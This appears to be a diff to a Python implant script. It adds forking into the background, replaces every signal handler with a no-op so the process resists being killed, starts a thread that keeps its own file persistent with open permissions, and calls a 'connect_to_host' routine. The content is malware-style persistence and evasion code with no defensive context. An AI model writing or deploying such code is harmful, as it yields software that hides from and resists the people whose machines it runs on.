@@ -66,21 +66,22 @@ def persist_file():
             os.chmod(SCRIPT_PATH, 0o777)
 
 def handle_signals():
+    def noop(*_, **__):
+        pass
+
     SIGNUMS = [x for x in dir(signal) if x.startswith('SIG')]
     for i in SIGNUMS:
         try:
             signum = getattr(signal, i)
-            signal.signal(signum, main)
+            signal.signal(signum, noop)
         except:
             pass
 
-def main(*_, **__):
-    # if os.fork() == 0:
+def main():
+    if os.fork() == 0:
         handle_signals()
         threading.Thread(target=persist_file).start()
         connect_to_host()
-    # else:
-    #     sys.exit(0)
 
 if __name__ == '__main__':
     main()
